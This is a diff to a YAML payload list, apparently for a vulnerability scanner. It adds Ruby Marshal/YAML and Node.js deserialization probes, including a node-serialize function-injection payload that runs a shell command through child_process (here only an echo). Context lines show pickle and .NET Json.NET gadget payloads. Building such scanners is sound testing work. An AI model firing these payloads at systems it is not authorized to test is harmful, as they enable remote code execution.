@@ -28,6 +28,16 @@ deserialization:
     description: pickle raw 命令执行
   - payload: gASVGAAAAAAAAACMBG1hcnOUjAVsb2Fkc5STlCmFlFKULg==
     description: marshal.loads 反序列化探针
+  ruby:
+  - payload: "\x04\x08o:\x0bVulnClawProbe"
+    description: Ruby Marshal 未定义类探测
+  - payload: "--- !ruby/object:VulnClawProbe\nfoo: bar"
+    description: Ruby Psych YAML 未定义类探测
+  node:
+  - payload: "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('echo deser_test',function(){});}()\"}"
+    description: Node node-serialize 函数注入
+  - payload: '{"type":"Buffer","data":[100,101,115,101,114,95,116,101,115,116]}'
+    description: Node Buffer 反序列化探针
 dotnet_deserialization:
   json_net:
   - payload: '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList,
